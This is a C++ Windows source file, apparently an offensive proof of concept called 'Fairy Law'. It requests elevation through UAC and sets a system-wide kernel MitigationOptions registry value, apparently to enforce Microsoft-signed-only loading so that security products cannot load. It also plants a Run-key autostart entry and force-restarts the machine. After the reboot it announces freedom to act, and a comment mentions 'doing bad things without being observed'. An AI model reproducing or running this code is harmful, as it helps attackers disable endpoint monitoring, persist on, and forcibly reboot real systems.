#include <windows.h>
#include <stdio.h>
#include <iostream>

//
//  Checks whether the current process is running elevated.
//  If yes -> awesome.
//  If no  -> time to beg UAC for mercy.
//
bool IsProcessElevated()
{
    HANDLE token = nullptr;
    TOKEN_ELEVATION elevation{};
    DWORD size = 0;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
        return false;

    bool elevated = false;

    if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size))
        elevated = (elevation.TokenIsElevated != 0);

    CloseHandle(token);
    return elevated;
}

//
//  Relaunches the current executable with administrator rights.
//  This triggers the glorious UAC pop-up…
//  where the user decides our fate.
//
void RestartElevated()
{
    char exePath[MAX_PATH] = {};

    // Get the full path to this executable
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);

    SHELLEXECUTEINFOA sei{};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas";        // The magic word
    sei.lpFile = exePath;        // Restart ourselves
    sei.nShow = SW_SHOWNORMAL;

    if (!ShellExecuteExA(&sei))
    {
        MessageBoxA(
            nullptr,
            "Couldn't restart with administrator privileges.\n"
            "Either UAC said 'No', or your PC is in a bad mood today.",
            "UAC Denied Our Destiny",
            MB_ICONERROR
        );
        return;
    }

    // A new elevated process is now running.
    // Time for this mortal process to fade away.
    ExitProcess(0);
}


bool AddToStartup()
{
    // 1. Get path of our own executable
    char exePath[MAX_PATH] = {};
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0)
    {
        std::cout << "Failed to get module file name.\n";
        return false;
    }

    // 2. Open the Run key
    HKEY hKey;
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS)
    {
        std::cout << "Failed to open Run key.\n";
        return false;
    }

    // 3. Write our path to the Run key
    result = RegSetValueExA(
        hKey,
        "MyProgramAutoStart",          // name of your entry
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(exePath),
        static_cast<DWORD>(strlen(exePath) + 1)
    );

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS)
    {
        std::cout << "Failed to set registry value.\n";
        return false;
    }

    std::cout << "Successfully added to Startup: " << exePath << "\n";
    return true;
}

void RunPowerShell(const char* command)
{
    SHELLEXECUTEINFOA sei{};
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NO_CONSOLE;
    sei.lpVerb = "open";
    sei.lpFile = "powershell.exe";

    // Build: powershell -Command "<command>"
    std::string cmd = "-Command \"";
    cmd += command;
    cmd += "\"";

    sei.lpParameters = cmd.c_str();
    sei.nShow = SW_SHOW;

    if (!ShellExecuteExA(&sei))
    {
        MessageBoxA(nullptr, "Failed to execute PowerShell", "Error", MB_ICONERROR);
    }
}

int main() {

    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sig{};
    if (GetProcessMitigationPolicy(GetCurrentProcess(), ProcessSignaturePolicy, &sig, sizeof(sig))) {
        printf("[+] MicrosoftSignedOnly = %d\n", sig.MicrosoftSignedOnly);
    }
    else {
        printf("[-] GetProcessMitigationPolicy-Failure: %lu\n", GetLastError());
    }

    if (sig.MicrosoftSignedOnly == 0) {
        printf("[+] Fairy Law will be executed...\n");

        if (IsProcessElevated())
        {
            std::cout << "[+] Process is elevated!\n"
                "    Admin mode activated. Engines online.\n"
                "    The dark forces of UAC cannot stop us anymore.\n";
        }
        else
        {
            std::cout << "[-] Not elevated!\n"
                "    We need more power...\n"
                "    Requesting admin privileges...\n";

            RestartElevated();
            return 0;
        }

        std::cout << "\n>> Admin-level operations now running...\n";

        HKEY hKey;
        LPCSTR subkey = "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel";
        LPCSTR valueName = "MitigationOptions";

        // The REG_BINARY value we want to set
        BYTE mitigationValue[] = {
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x10, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00
        };

        DWORD disposition;

        // Open or create the registry key
        LONG result = RegCreateKeyExA(
            HKEY_LOCAL_MACHINE,              // root hive
            subkey,                          // subkey path
            0,
            NULL,                            // class type (unused)
            REG_OPTION_NON_VOLATILE,         // key persists after reboot
            KEY_WRITE | KEY_READ,            // access rights
            NULL,                            // security attributes
            &hKey,                           // returned key handle
            &disposition                     // tells if key was created or opened
        );

        if (result != ERROR_SUCCESS) {
            printf("Error opening/creating registry key: %ld\n", result);
            return 1;
        }

        if (disposition == REG_CREATED_NEW_KEY) {
            printf("Registry key was created.\n");
        }
        else {
            printf("Registry key already exists.\n");
        }

        // Set or overwrite the REG_BINARY value
        result = RegSetValueExA(
            hKey,
            valueName,                       // value name
            0,
            REG_BINARY,                      // binary value
            mitigationValue,                 // data buffer
            sizeof(mitigationValue)          // size of the binary data
        );

        if (result != ERROR_SUCCESS) {
            printf("Error writing value: %ld\n", result);
            RegCloseKey(hKey);
            return 1;
        }

        printf("MitigationOptions successfully written.\n");

        RegCloseKey(hKey);

        if (AddToStartup()) {
            std::cout << "Autostart enabled.\n";
        }
        else {
            std::cout << "Autostart failed.\n";
        }

        RunPowerShell("Restart-Computer -Force -ErrorAction SilentlyContinue"); // I was too lazy to implement a differnt restart logic.
    }
    else {
        printf("[+] Fairy Law was executed\n");
        printf("[+] You can now do whatever you want with grace.\n");
        Sleep(30000);
        // Doing bad things without being observed 
    }

    return 0;
}
